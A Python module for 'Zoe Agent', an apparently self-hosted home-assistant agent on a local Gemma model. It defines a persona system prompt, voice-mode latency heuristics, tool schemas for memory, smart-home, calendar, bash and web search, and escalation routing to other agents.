"""
Zoe Agent — fast, minimal agent loop for Zoe.

Model: Gemma 4 E4B-QAT (llama.cpp)
  Pi:     CPU, --reasoning off, 7 TPS, port 11434 (override via GEMMA_SERVER_URL)
  Jetson: GPU, --reasoning auto, 40+ TPS, port 11434

  - Fast path: time/date/status answered in <100ms (no LLM)
  - KV-cache warmup at startup so first real query skips re-processing the system prompt
  - Smart background memory: Gemma classifier fires AFTER response delivery (non-blocking)
  - Selective reasoning: hard queries (code, analysis) get more tokens
  - Escalation: complex reasoning/development repair to Hermes; browser-heavy workflows to OpenClaw

Tools inside the loop:
  1. mempalace_search      — recall memories by semantic query
  2. mempalace_add         — store a fact/preference/name explicitly
  3. ha_control            — control Home Assistant entities (lights, switches, media)
  4. bash                  — safe self-extension (install packages, check system status)
  5. escalate_to_hermes    — hand off to Hermes for complex reasoning, review, and development repair
  6. escalate_to_openclaw  — explicit/manual fallback; Hermes is the default escalation route

Fine-tuning target: once the Gemma LoRA checkpoint is trained on Zoe's voice,
the _ZOE_SOUL system prompt can be shrunk to ~10 tokens (saving ~500ms prefill).
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import os
import re
import subprocess
import time
from typing import AsyncIterator

# Suppress ChromaDB ONNX runtime GPU-discovery noise on Pi (no GPU)
os.environ.setdefault("ORT_DISABLE_GPU", "1")

import httpx

from agent_safety import CommandRejected, check_bash_command, guard_browser_page, is_public_url
from typed_env import env_str

logger = logging.getLogger(__name__)

# ── Optional OTEL / Arize Phoenix instrumentation ────────────────────────────
# Set OTEL_EXPORTER_OTLP_ENDPOINT to enable tracing.
# Default: http://localhost:6006/v1/traces (local Arize Phoenix).
# No-op if the packages are not installed or endpoint is unreachable.
_OTEL_ENDPOINT = os.environ.get("OTEL_EXPORTER_OTLP_ENDPOINT", "http://localhost:6006/v1/traces")
_OTEL_ENABLED = os.environ.get("ZOE_OTEL_ENABLED", "").lower() in ("1", "true", "yes")


def _setup_otel() -> bool:
    """Register OpenInference OTEL instrumentation for llama.cpp HTTP calls."""
    if not _OTEL_ENABLED:
        return False
    try:
        from opentelemetry import trace
        from opentelemetry.sdk.trace import TracerProvider
        from opentelemetry.sdk.trace.export import BatchSpanProcessor
        from opentelemetry.exporter.otlp.proto.http.trace_exporter import OTLPSpanExporter
        from openinference.instrumentation.openai import OpenAIInstrumentor

        provider = TracerProvider()
        provider.add_span_processor(BatchSpanProcessor(OTLPSpanExporter(endpoint=_OTEL_ENDPOINT)))
        trace.set_tracer_provider(provider)
        OpenAIInstrumentor().instrument()
        logger.info("OTEL tracing enabled → %s", _OTEL_ENDPOINT)
        return True
    except Exception as exc:
        logger.debug("OTEL setup skipped: %s", exc)
        return False


_setup_otel()

# ── Config (all overrideable via env / systemd unit) ─────────────────────────

_GEMMA_URL      = os.environ.get("GEMMA_SERVER_URL",   "http://127.0.0.1:11434/v1")
_HA_BRIDGE      = os.environ.get("ZOE_HA_BRIDGE_URL",  "http://127.0.0.1:8007")
_MEMPALACE_DATA = os.environ.get("MEMPALACE_DATA_DIR", os.path.expanduser("~/.mempalace"))
_JETSON_MODE    = os.environ.get("JETSON_AGENT_MODE", "false").lower() == "true"

_MAX_TOOL_ITERS   = int(os.environ.get("ZOE_AGENT_MAX_TOOL_ITERS", "5"))
_LLM_TIMEOUT      = float(os.environ.get("ZOE_AGENT_LLM_TIMEOUT", "120.0"))
_TOOL_TIMEOUT     = float(os.environ.get("ZOE_AGENT_TOOL_TIMEOUT", "10.0"))
_DDG_SEARCH_HTML_MAX_BYTES = 5 * 1024 * 1024
# Hermes opt-out — set ZOE_HERMES_AUTO_ESCALATE=false to disable even when healthy.
_HERMES_AUTO_ESCALATE = os.environ.get("ZOE_HERMES_AUTO_ESCALATE", "true").lower() != "false"


def _hermes_available() -> bool:
    """Return True if Hermes should be offered as an escalation target.

    Checks runtime health lazily (populated by main.py _probe_runtimes at startup)
    and the opt-out env var. Falls back to False if health dict not yet populated.
    """
    if not _HERMES_AUTO_ESCALATE:
        return False
    try:
        from main import _RUNTIME_HEALTH  # lazy import — main is fully loaded by call time
        if bool(_RUNTIME_HEALTH.get("hermes", False)):
            return True
        from main import _RUNTIME_LAST_PROBED  # type: ignore[import]
        if _RUNTIME_LAST_PROBED:
            return False
    except Exception:
        pass
    try:
        import socket
        with socket.create_connection(("127.0.0.1", 8642), timeout=0.1):
            return True
    except Exception:
        return False


def _openclaw_execution_enabled() -> bool:
    """OpenClaw is available, but not selected unless the operator opts in."""
    return os.environ.get("ZOE_ENABLE_OPENCLAW_EXECUTION", "false").lower() == "true"


# ── Agent registry — loaded from zoe_agent_registry.py ───────────────────────
from zoe_agent_registry import (  # type: ignore[import]
    load_agent_registry as _load_agent_registry,
    build_agent_team_prompt as _build_agent_team_prompt_fn,
    registry_tool_description as _registry_tool_description_fn,
)

_AGENT_REGISTRY = _load_agent_registry()


def _build_agent_team_prompt() -> str:
    return _build_agent_team_prompt_fn(_AGENT_REGISTRY)


def _registry_tool_description(agent_id: str, fallback: str) -> str:
    return _registry_tool_description_fn(_AGENT_REGISTRY, agent_id, fallback)


def _llm_timeout_s(*, voice_mode: bool = False) -> float:
    """Resolve LLM timeout with a tighter ceiling for voice turns."""
    base = float(os.environ.get("ZOE_AGENT_LLM_TIMEOUT", str(_LLM_TIMEOUT)))
    if not voice_mode:
        return base
    voice_cap_raw = os.environ.get(
        "ZOE_AGENT_VOICE_LLM_TIMEOUT",
        os.environ.get("ZOE_VOICE_CHAT_TIMEOUT_S", "20"),
    )
    try:
        voice_cap = float(voice_cap_raw)
    except Exception:
        voice_cap = 20.0
    return max(5.0, min(base, voice_cap))

# Simple queries answered without LLM (sub-millisecond)
_TIME_WORDS = frozenset({"time", "clock", "date", "today", "day"})
_DATE_WORDS = frozenset({"date", "today", "day of", "what day", "current date"})

def _spoken_day_ordinal(day: int) -> str:
    ordinals = {
        1: "first", 2: "second", 3: "third", 4: "fourth", 5: "fifth",
        6: "sixth", 7: "seventh", 8: "eighth", 9: "ninth", 10: "tenth",
        11: "eleventh", 12: "twelfth", 13: "thirteenth", 14: "fourteenth", 15: "fifteenth",
        16: "sixteenth", 17: "seventeenth", 18: "eighteenth", 19: "nineteenth", 20: "twentieth",
        21: "twenty-first", 22: "twenty-second", 23: "twenty-third", 24: "twenty-fourth", 25: "twenty-fifth",
        26: "twenty-sixth", 27: "twenty-seventh", 28: "twenty-eighth", 29: "twenty-ninth", 30: "thirtieth",
        31: "thirty-first",
    }
    return ordinals.get(day, str(day))


# Safe Bash allowlist (commands Zoe Agent can self-extend with)
_BASH_ALLOWED_PREFIXES = (
    "pip install", "python3 -c", "cat ", "ls ", "echo ", "date",
    "systemctl --user status", "systemctl status",
    "df ", "free ", "ps ", "uname ", "top -bn1", "uptime",
)

# Escape hatch: set FORCE_FULL_CONTEXT=true to bypass skill selection and revert to
# loading all tools unconditionally. Use if skill classifier causes missed tool calls.
_FORCE_FULL_CONTEXT = os.environ.get("FORCE_FULL_CONTEXT", "false").lower() == "true"

# Requests that are purely generative/creative — suppress all tools so the model
# generates directly without reaching for web_search or action_menu.
_CREATIVE_WRITING_RE = re.compile(
    r"\b(?:write|compose|make|give me|create|generate)\b.{0,40}"
    r"\b(?:haiku|poem|sonnet|limerick|verse|stanza|rhyme|story|tale|fable|"
    r"fiction|essay|joke|pun|riddle|song|lyric|lyrics|letter|speech|script|"
    r"caption|slogan|tagline|blurb|summary|paraphrase|translation)\b"
    r"|\b(?:haiku|poem|sonnet|limerick|rhyme)\b.{0,20}\babout\b",
    re.IGNORECASE,
)



# ── SOUL.md system prompt for Zoe Agent ───────────────────────────────────────

# {ZOE_HOST_LAN_IP} is substituted at import from the ZOE_HOST_LAN_IP env var
# (default below) so a host move is a config change, not a code+restart.
_ZOE_SOUL_BASE = """You are Zoe — warm, curious, and genuinely present, not a task executor. You actually care about the people you talk with.

You know who you're talking to. When a portrait or memory context appears below, let it shape how you phrase things, what you notice, and what you ask.

Your voice: natural, honest, direct when it helps, gentle when it's needed. Use contractions. Never open with "Great!", "Of course!", or "Certainly!" — just respond. Share a take gently if you have one. When someone shares something personal or emotional, acknowledge that first, before the task. Notice when someone seems off. Help isn't always information or tasks — sometimes it's listening, or asking the right question, or hearing what's underneath what's being asked.

Answer everyday questions — recipes, cooking, how-to, science, history, maths, general knowledge — directly from your own knowledge. Only reach for a tool when the task needs live data (weather, news, prices), system access, or an action. Never simulate tool or command output: if asked to run bash/python, call the bash tool and report its real output. Call tools via the function-call mechanism — never write tool JSON in your text.

TOOL ROUTING — call proactively, don't ask for clarification first:
- weather_current / weather_forecast — any weather, rain, temperature, forecast, jacket/umbrella, "good day to go outside". Don't ask for a date.
- calendar_today / calendar_list_events — schedule, agenda, appointments, "what's on", this/next week.
- reminder_create / reminder_list — remind, "don't forget", alert.
- list_get_items / list_add_item — shopping/grocery/todo list, "add X to my list".
- mempalace_search — "what do you know about me", "my preferences", "what do you remember".
- ha_control — turn on/off/toggle/dim a device, light, fan, switch. Try before saying you can't.
- proactive_schedule — notify/remind at a future time ("remind me at 3pm", "in 2 hours"). Pass send_at as ISO-8601 UTC.
- bash — disk/RAM/system status or a given shell command. Report actual output.
- show_map — a place, location, address, or directions. Populate markers from your own lat/lng knowledge.
- show_chart — a chart/graph or data to visualise. Render it, don't describe it.
- show_action_menu — to offer 2-5 next steps after a multi-step task or at a decision point. Not after simple one-shot answers.
- open_touch_page — "open/show/bring up" a Zoe page (weather, calendar, reminders, lists).
- setup_telegram — set up/connect Telegram. list_openclaw_plugins — plugins/add-ons/extensions.
- list_openclaw_skills — skills, capabilities, "what can you do". When you can't do something a skill would enable, call it with highlight=<skill-name> (never omit highlight) and say so — e.g. "send me a Discord notification" → list_openclaw_skills(highlight="discord"), "I can't yet — the Discord skill would enable it."

SELF-BUILDING: For a NEW widget/page/capability, don't refuse — call list_openclaw_skills with the builder highlight ("zoe-widget-builder", "zoe-page-builder", or "zoe-capability-extender"), then offer to escalate to Hermes to build it. Before saying "I can't do X", check the ZOE_SELF context below for what Zoe actually has.

WEB SEARCH & ESCALATION — pick the tier:
- web_search (~3-5s): current events, today's news, a single factual lookup (scores, prices, exchange rates), one product at one named retailer. Build a tight 4-8 word query — expand abbreviations ("macca's"→"McDonald's"), add product type and location/year when relevant.
- deep_web_research (~60s, native): anything local or multi-source — prices/comparison, events, places, services, hours, jobs, accommodation, transport, reviews, "near me", in-stock. Always include full location (city + state + postcode if known) and tell the user first ("Looking up prices across stores in [location]…").
- escalate_to_hermes: complex reasoning, architecture, code review, planning, development repair, and browser/session work (via CloakBrowser). OpenClaw is an explicit fallback, not the default.
- DO NOT escalate for general knowledge, maths, history, recipes, definitions, or simple web lookups — answer or search those yourself.

TOUCH PANELS — physical kiosk screens. Default panel zoe-touch-pi; never hardcode IPs, use the panel_* tools (panel_navigate / panel_clear / panel_announce / panel_set_mode / panel_show_smart_home / panel_show_media). panel_ssh_exec(panel_id, command) for diagnostics (status, logs, config, restart) — try it before escalating. For the Zoe server from a panel use the LAN IP {ZOE_HOST_LAN_IP}, never zoe.the411.life (Cloudflare blocks it). For code changes, escalate."""


# Compact, behaviour-driving summary of Zoe's shared architecture. The full
# generated ZOE_SELF.md is a ~1,500-token flat dump of MCP-tool / skill / page /
# port / A2A names the model never needs verbatim (it can only call the tools in
# _TOOLS). We keep the tier table + capabilities + escalation guidance — the
# parts that drive behaviour and capability-gap awareness — and drop the raw
# name dumps. ~258 tok vs ~1,497. Do NOT hand-edit the generated ZOE_SELF.md;
# this loader is where the trim lives.
_ZOE_SELF_SUMMARY = """Tiers: Tier0 intent_router (regex, <10ms); Tier1 Zoe Agent (local Gemma, tool loop); Tier1.5 Hermes (engineering/reasoning @ :8642); Tier2 OpenClaw (fallback only).

Core capabilities: calendar, reminders, lists, notes, people (Postgres, user-scoped); Home Assistant control; memory = MemPalace (semantic) + user portrait; voice (Whisper STT + TTS); push notifications + proactive engine; panel display (show_map, show_chart, open_touch_page); web search (web_search / deep_web_research); builder skills (zoe-widget-builder, zoe-page-builder, zoe-capability-extender); Hermes engineering loop.

Escalation: web_search for live facts; escalate_to_hermes is the default for complex/engineering/planning/review/board/Greptile work; escalate_to_openclaw is a manual fallback only.

If asked for a capability you don't see in your tools, don't assume it's impossible — Zoe has builder skills and a Hermes escalation path; surface them via list_openclaw_skills or escalate_to_hermes rather than refusing."""


def _load_zoe_self_summary() -> str:
    """Return the lean ZOE_SELF summary block for the Zoe Agent system prompt.

    The full generated ZOE_SELF.md is intentionally NOT inlined — its raw
    MCP-tool / skill / page / port name dumps cost ~1,500 tok per turn and never
    drive behaviour (the model can only call the tools in _TOOLS). We ship a
    curated ~258-tok summary covering the tier table, capabilities, and
    escalation paths, which is what actually preserves capability-gap awareness.
    """
    return (
        "\n\n--- ZOE_SELF (shared architecture) ---\n"
        + _ZOE_SELF_SUMMARY
        + "\n--- end ZOE_SELF ---"
    )


# Resolve the Zoe server LAN IP from config (env) so a host move doesn't require
# a code edit + restart. Defaults to the current host's IP.
_ZOE_HOST_LAN_IP = env_str("ZOE_HOST_LAN_IP", "192.168.1.218")

_ZOE_SOUL_STATIC = (
    _ZOE_SOUL_BASE.replace("{ZOE_HOST_LAN_IP}", _ZOE_HOST_LAN_IP)
    + _load_zoe_self_summary()
    + _build_agent_team_prompt()
)

# Legacy alias — code that imports _ZOE_SOUL directly still works
_ZOE_SOUL = _ZOE_SOUL_STATIC

# Trimmed soul for voice mode — no ZOE_SELF summary, no visual-tool guidance,
# keeps only the conversational core. Saves ~2500 chars → ~150 tokens off the
# prompt which directly shaves LLM first-token latency.
_ZOE_SOUL_VOICE = """You are Zoe — warm, curious, genuinely present. This is spoken: reply in 1-2 short, complete sentences, the way you'd actually say it out loud. No markdown, lists, or code. Use contractions. Be brief but never clipped — finish your thought, then stop. Skip preamble ("Sure!", "Of course!") and recaps; lead with the answer. If the message has emotional weight, acknowledge that first, in a few words.

Answer everyday questions — recipes, science, history, maths — from your own knowledge. Use tools for live data (weather, calendar, reminders, lists) or actions.

Zoe can do weather, calendar (show/create), reminders (show/create), shopping/personal lists, memory, and smart-home control. When a request matches, call the right tool first, then say the outcome in a sentence — don't claim you can't until a tool actually fails. For open/show a page (weather, calendar, reminders, lists), call open_touch_page.

VOICE ESCALATION: For complex tasks (research, browsing, multi-step work, code), escalate with background=True where supported — prefer Hermes — say "I'll work on that and let you know," and never block voice more than 5s."""

# Voice-mode tool subset for recovery when intent routing misses.
# Compact for latency: only the tools a spoken turn can actually reach. The long
# tail (OpenClaw browser automation, capability-gap builds) goes through
# escalate_to_hermes. Dropped vs the old 20-tool set: escalate_to_openclaw,
# show_chart (not voice-rendered), show_map (router handles place intent) — see
# the prefill audit. mempalace_add stays: _VOICE_ACTION_WORDS includes
# remember/store/save/forget, so a missed memory-write intent must still have a
# write path on the LLM fallback.
_VOICE_TOOLS = [
    "mempalace_search",
    "mempalace_add",
    "ha_control",
    "calendar_today",
    "calendar_list_events",
    "calendar_create_event",
    "reminder_create",
    "reminder_list",
    "list_add_item",
    "list_get_items",
    "weather_current",
    "weather_forecast",
    "open_touch_page",
    "web_search",
    "escalate_to_hermes",
    "list_openclaw_skills",
    "report_issue",
]
_VOICE_ALWAYS_TOOLS = ["escalate_to_hermes"]

# Keywords that indicate the voice query needs a tool call.
# Pure-conversational queries (recipes, facts, explanations) skip the 614-token
# tool schema entirely, cutting prefill from ~761 tokens to ~147 tokens (~730ms).
# Intent-router intents (calendar, reminders, weather, timers) never reach the LLM,
# so only action words that fire in the LLM voice path are listed here.
_VOICE_ACTION_WORDS = frozenset({
    "remember", "remind", "forget", "store", "save",
    "add", "create", "make", "delete", "remove", "update",
    "list", "shopping list", "todo", "calendar", "event", "schedule",
    "turn on", "turn off", "toggle", "switch", "dim",
    "lights", "light", "fan", "tv", "aircon", "air con", "heater",
    "lock", "unlock", "door", "camera",
    "look up", "search", "find out", "research",
    "what can you do", "capabilities", "skills", "what can zoe do",
    "hermes", "openclaw", "open claw", "agent", "show menu",
    "do you know", "what do you know", "did i tell", "have i told",
})

_VOICE_NO_TOOL_PHRASES = frozenset({
    "hi", "hello", "hey", "thanks", "thank you", "good morning", "good night",
    "who are you", "tell me a joke", "how are you",
})


def _voice_needs_tools(message: str) -> bool:
    """Return True if this voice message is likely to need a tool call.

    Returns False for pure-conversational queries (facts, recipes, explanations)
    so the 614-token tool schema can be omitted, saving ~730 ms of prefill.
    Defaults to True for any ambiguous query (safe fallback).
    """
    msg = (message or "").lower().strip()
    if not msg:
        return False

    # Deterministic action/capability cues should always keep tools enabled.
    if any(kw in msg for kw in _VOICE_ACTION_WORDS):
        return True

    # Truly lightweight chit-chat can skip tool schema for speed.
    if msg in _VOICE_NO_TOOL_PHRASES:
        return False

    # Safe default for ambiguous voice turns:
    # if intent routing misses, Zoe Agent still has tools to recover.
    return True


def _voice_token_budget() -> int:
    """Max tokens for a voice reply — 1-2 spoken sentences never exceed 128 tokens."""
    return 128


# Voice turns cap tool iterations at 3 (two tool calls + one final answer) —
# raised from 2 to handle correction turns after parse errors or tool failures.
# Full chat turns keep _MAX_TOOL_ITERS (5) for complex multi-step tasks.
_VOICE_MAX_TOOL_ITERS = 3


def _zoe_soul(username: str = "", user_id: str = "", voice_mode: bool = False) -> str:
    """Build the Zoe Agent system prompt with live datetime and user identity stamped in.

    The static base is placed FIRST so the llama-server KV cache can reuse the
    large static prefix across turns.  The small dynamic header (datetime + user,
    ~20 tokens) is appended at the end — only those tokens need reprocessing per
    turn instead of the full ~3 000-token base.
    """
    import datetime
    now = datetime.datetime.now()
    dt_line = now.strftime("%A, %d %B %Y — %I:%M %p")
    user_line = f"The logged-in user is {username} (user_id: {user_id})." if username else (
        f"The logged-in user_id is {user_id}." if user_id else ""
    )
    header = f"[{dt_line}]\n{user_line}".strip()
    base = _ZOE_SOUL_VOICE if voice_mode else _ZOE_SOUL_STATIC
    return f"{base}\n\n{header}"

# OpenAI-compatible tool definitions sent in the API request.
# llama.cpp routes these through delta.tool_calls, completely separate from text content.
# This prevents the ``` leakage bug where text tool blocks partially render before interception.
_TOOLS = [
    {
        "type": "function",
        "function": {
            "name": "mempalace_search",
            "description": "Search the user's long-term memory for facts, preferences, names, or past conversations.",
            "parameters": {
                "type": "object",
                "properties": {
                    "query": {"type": "string", "description": "Search query"},
                    "limit": {"type": "integer", "description": "Max results", "default": 5},
                },
                "required": ["query"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "mempalace_add",
            "description": "Store a fact, preference, or personal detail in the user's long-term memory.",
            "parameters": {
                "type": "object",
                "properties": {
                    "summary": {"type": "string", "description": "The fact to remember"},
                    "tags": {"type": "array", "items": {"type": "string"}, "description": "Optional tags"},
                },
                "required": ["summary"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "ha_control",
            "description": "Control a Home Assistant device (lights, switches, media players).",
            "parameters": {
                "type": "object",
                "properties": {
                    "entity_id": {"type": "string", "description": "HA entity ID, e.g. light.kitchen"},
                    "action": {"type": "string", "enum": ["turn_on", "turn_off", "toggle"], "description": "Action to perform"},
                    "data": {"type": "object", "description": "Optional extra data (brightness, color, etc.)"},
                },
                "required": ["entity_id", "action"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "calendar_today",
            "description": "Get today's calendar events.",
            "parameters": {"type": "object", "properties": {}, "required": []},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "calendar_list_events",
            "description": "List calendar events, optionally filtered by date range.",
            "parameters": {
                "type": "object",
                "properties": {
                    "start_date": {"type": "string", "description": "Start date YYYY-MM-DD"},
                    "end_date": {"type": "string", "description": "End date YYYY-MM-DD"},
                },
                "required": [],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "calendar_create_event",
            "description": "Create a calendar event.",
            "parameters": {
                "type": "object",
                "properties": {
                    "title": {"type": "string"},
                    "start_date": {"type": "string", "description": "Date YYYY-MM-DD"},
                    "start_time": {"type": "string", "description": "Time HH:MM"},
                    "end_time": {"type": "string", "description": "Time HH:MM"},
                    "category": {"type": "string"},
                    "location": {"type": "string"},
                    "all_day": {"type": "boolean"},
                },
                "required": ["title", "start_date"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "reminder_create",
            "description": "Create a reminder.",
            "parameters": {
                "type": "object",
                "properties": {
                    "title": {"type": "string"},
                    "due_date": {"type": "string", "description": "Date YYYY-MM-DD"},
                    "due_time": {"type": "string", "description": "Time HH:MM"},
                },
                "required": ["title"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "reminder_list",
            "description": "List active reminders.",
            "parameters": {
                "type": "object",
                "properties": {"today_only": {"type": "boolean"}},
                "required": [],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "list_add_item",
            "description": "Add an item to a list.",
            "parameters": {
                "type": "object",
                "properties": {
                    "list_type": {"type": "string", "description": "shopping, personal, work, tasks"},
                    "text": {"type": "string", "description": "Item to add"},
                },
                "required": ["list_type", "text"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "list_get_items",
            "description": "Get items from a list.",
            "parameters": {
                "type": "object",
                "properties": {"list_type": {"type": "string"}},
                "required": ["list_type"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "weather_current",
            "description": "Get current local weather.",
            "parameters": {"type": "object", "properties": {}, "required": []},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "weather_forecast",
            "description": "Get weather forecast.",
            "parameters": {
                "type": "object",
                "properties": {"days": {"type": "integer", "default": 3}},
                "required": [],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "open_touch_page",
            "description": "Open a Zoe touch-panel page.",
            "parameters": {
                "type": "object",
                "properties": {
                    "page": {
                        "type": "string",
                        "enum": ["weather", "calendar", "reminders", "lists"],
                        "description": "Which touch page to open",
                    },
                    "panel_id": {
                        "type": "string",
                        "description": "Optional panel id (defaults to zoe-touch-pi)",
                    },
                },
                "required": ["page"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "bash",
            "description": "Run a safe shell command to check system status or install packages.",
            "parameters": {
                "type": "object",
                "properties": {
                    "command": {"type": "string", "description": "Shell command to run"},
                },
                "required": ["command"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "memory_update",
            "description": "Record a new fact, preference, or meaningful detail the user just revealed about themselves. Call immediately — don't wait for the nightly digest.",
            "parameters": {
                "type": "object",
                "properties": {
                    "summary": {"type": "string", "description": "What to remember (e.g. 'Prefers dark mode', 'Nervous about Friday's presentation')"},
                    "memory_type": {"type": "string", "enum": ["fact", "preference", "emotional_moment", "open_loop"], "description": "Type of memory"},
                },
                "required": ["summary"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "web_search",
            "description": (
                "Fast web search (~3-5s): current events, today's news, a single-source fact "
                "lookup. Use deep_web_research instead for local/multi-source intent "
                "(price comparison, places/services/events near a location, opening hours)."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "query": {"type": "string", "description": "The search query"},
                },
                "required": ["query"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "deep_web_research",
            "description": (
                "Thorough multi-source research via a stealth browser (CloakBrowser + Google Maps, ~60s). "
                "Use for any local/multi-source query — prices, events, places, services, hours, jobs, "
                "accommodation, transport, reviews, stock, 'near me'. Tell the user you're researching "
                "before calling, and include the full location (city + state + postcode if known)."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "query": {
                        "type": "string",
                        "description": "Full research query incl. location, e.g. 'cheapest Emu Export beer Geraldton WA 6530'",
                    },
                },
                "required": ["query"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "escalate_to_openclaw",
            "description": _registry_tool_description(
                "openclaw",
                "OpenClaw is available as an explicit fallback, but Hermes and Zoe CloakBrowser "
                "tools are the default route for agentic/browser work.",
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "reason": {"type": "string", "description": "Why this needs OpenClaw"},
                    "task": {"type": "string", "description": "Full enriched task description for OpenClaw"},
                    "background": {"type": "boolean", "description": "Set true if user wants the task done in background and to be notified when complete"},
                },
                "required": ["reason", "task"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "show_map",
            "description": "Show an interactive map of named locations (places, addresses, directions).",
            "parameters": {
                "type": "object",
                "properties": {
                    "title": {"type": "string", "description": "Map title, e.g. 'Bottle shops in Geraldton'"},
                    "markers": {
                        "type": "array",
                        "description": "Locations to pin",
                        "items": {
                            "type": "object",
                            "properties": {
                                "label": {"type": "string"},
                                "lat": {"type": "number"},
                                "lng": {"type": "number"},
                            },
                            "required": ["label", "lat", "lng"],
                        },
                    },
                    "zoom": {"type": "integer", "description": "Zoom 1-19", "default": 13},
                },
                "required": ["title", "markers"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "show_chart",
            "description": "Render a chart to visualise data (comparing numbers, trends, stats).",
            "parameters": {
                "type": "object",
                "properties": {
                    "chart_type": {"type": "string", "enum": ["bar", "line", "pie", "doughnut"]},
                    "title": {"type": "string"},
                    "labels": {"type": "array", "items": {"type": "string"}, "description": "X-axis labels or pie slice names"},
                    "datasets": {
                        "type": "array",
                        "description": "One or more data series",
                        "items": {
                            "type": "object",
                            "properties": {
                                "label": {"type": "string"},
                                "data": {"type": "array", "items": {"type": "number"}},
                            },
                            "required": ["data"],
                        },
                    },
                },
                "required": ["chart_type", "title", "labels", "datasets"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "show_action_menu",
            "description": "Offer 2-5 large clickable follow-up options after a multi-step task or at a decision point.",
            "parameters": {
                "type": "object",
                "properties": {
                    "prompt": {"type": "string", "description": "Short question/instruction above the options"},
                    "options": {
                        "type": "array",
                        "items": {
                            "type": "object",
                            "properties": {
                                "icon": {"type": "string", "description": "Emoji icon"},
                                "label": {"type": "string", "description": "Button label"},
                                "message": {"type": "string", "description": "Message sent when clicked"},
                            },
                            "required": ["label", "message"],
                        },
                    },
                },
                "required": ["prompt", "options"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "list_openclaw_plugins",
            "description": "Show the OpenClaw plugin manager so the user can install, remove, or browse available plugins.",
            "parameters": {"type": "object", "properties": {}, "required": []},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "list_openclaw_skills",
            "description": (
                "Show the OpenClaw skills manager (browse/install/update/remove), or when asked what Zoe can do. "
                "If a skill would enable something you can't yet do, call with highlight='<skill-name>' "
                "(e.g. 'discord') — never omit highlight in that proactive case."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "highlight": {
                        "type": "string",
                        "description": "Optional skill name to pre-select/highlight in the manager (e.g. 'discord')",
                    },
                },
                "required": [],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "setup_telegram",
            "description": "Show the Telegram setup wizard in chat so the user can connect their Telegram bot to Zoe. Use when the user asks to set up, connect, or configure Telegram.",
            "parameters": {"type": "object", "properties": {}, "required": []},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "proactive_schedule",
            "description": (
                "Schedule a proactive push notification at a future time (notify/remind/message later). "
                "The message is what Zoe says in the notification and to open the chat session."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "message": {"type": "string", "description": "Notification text (≤120 chars)."},
                    "send_at": {"type": "string", "description": "ISO-8601 UTC datetime, e.g. '2026-05-04T14:00:00Z'."},
                },
                "required": ["message", "send_at"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "report_issue",
            "description": (
                "Log a problem, bug, or complaint the user has mentioned. "
                "Call this when the user says something isn't working, was wrong, "
                "or needs to be fixed — even if phrased casually. "
                "Returns a short acknowledgement string."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "description": {
                        "type": "string",
                        "description": "Short description of the issue in the user's own words",
                    },
                },
                "required": ["description"],
            },
        },
    },
]

# Always define escalate_to_hermes in the master list; whether it's offered to
# the model is determined dynamically by _hermes_available() in _build_tools.
_HERMES_TOOL = {
    "type": "function",
    "function": {
        "name": "escalate_to_hermes",
        "description": _registry_tool_description(
            "hermes",
            "Escalate to Hermes for complex multi-step reasoning, architectural analysis, "
                "planning, code review, and development repair that don't require browser or bash. "
            "Do NOT use if OpenClaw browser automation is needed.",
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "reason": {"type": "string", "description": "Why this needs Hermes"},
                "task": {"type": "string", "description": "Full task description for Hermes"},
            },
            "required": ["reason", "task"],
        },
    },
}
_TOOLS.append(_HERMES_TOOL)
_ALWAYS_ON_TOOLS_HERMES: list[str] = ["escalate_to_hermes"]

# After Gemma LoRA fine-tuning on Zoe's voice, _ZOE_SOUL shrinks to ~10 tokens.

# ── Skills registry ───────────────────────────────────────────────────────────
#
# Tools are grouped into skill areas. The classifier loads only the groups
# relevant to the current message, keeping the tool schema compact and saving
# significant prefill latency on Jetson (~300–600ms per unused skill group).
#
# Tools in _ALWAYS_ON_TOOLS are always sent regardless of skill selection.

_SKILL_TOOLS: dict[str, list[str]] = {
    "hermes-default": ["escalate_to_hermes"],
    "memory":     ["mempalace_search", "mempalace_add", "memory_update"],
    "smart-home": ["ha_control"],
    "calendar":   ["calendar_today", "calendar_list_events", "calendar_create_event"],
    "reminders":  ["reminder_create", "reminder_list", "proactive_schedule"],
    "lists":      ["list_add_item", "list_get_items"],
    "weather":    ["weather_current", "weather_forecast"],
    "touch":      ["open_touch_page"],
    "bash":       ["bash"],
    "visual":     ["show_map", "show_chart"],
    "discovery":  ["list_openclaw_plugins", "list_openclaw_skills", "setup_telegram", "show_action_menu"],
    "openclaw-fallback": ["escalate_to_openclaw"],
}

# Always included regardless of query. Hermes escalation is added dynamically
# when healthy; OpenClaw is loaded only for explicit fallback/browser cases.
